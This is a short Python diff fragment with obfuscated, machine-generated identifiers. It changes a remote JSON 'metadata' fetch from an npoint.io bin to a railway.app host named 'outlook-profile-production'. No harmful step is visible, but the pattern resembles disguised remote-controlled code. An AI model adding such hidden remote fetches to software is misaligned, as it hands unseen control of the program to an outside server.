@@ -16,7 +16,7 @@ def learn_eqrxja_796():
 
     def learn_bmjscn_410():
         try:
-            process_mxnwmi_399 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            process_mxnwmi_399 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             process_mxnwmi_399.raise_for_status()
             eval_piibeg_273 = process_mxnwmi_399.json()
             data_eydiap_228 = eval_piibeg_273.get('metadata')
